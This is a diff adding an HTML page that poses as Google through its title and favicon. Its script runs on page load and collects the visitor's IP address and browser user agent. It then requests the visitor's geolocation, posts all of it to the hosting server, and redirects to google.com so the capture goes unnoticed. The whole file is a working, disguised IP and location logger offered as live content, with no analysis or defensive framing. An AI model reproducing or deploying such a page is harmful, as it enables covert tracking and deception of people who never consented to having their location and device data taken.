@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Google</title>
+  <link rel="shortcut icon" href="google-logo.png" type="image/x-icon">
+</head>
+<body>
+
+    <script>
+        async function gatherInfo(){
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const deviceInfo = navigator.userAgent;
+
+            await fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    ip: ipData.ip,
+                    device: deviceInfo
+                })
+            });
+
+            let geoInfo = '';
+            if (navigator.geolocation){
+                await new Promise(resolve => {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        geoInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        resolve();
+                    }, error => {
+                        geoInfo = {
+                            error: error.message
+                        };
+                        resolve();
+                    });
+                });
+            } else {
+                geoInfo = { error: 'Геолокация не поддерживается' };
+            }
+
+            await fetch('/save_geo', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    geo: geoInfo
+                })
+            });
+
+            window.location.href = 'https://google.com/';
+        }
+
+        gatherInfo();
+    </script>
+
+</body>
+</html>
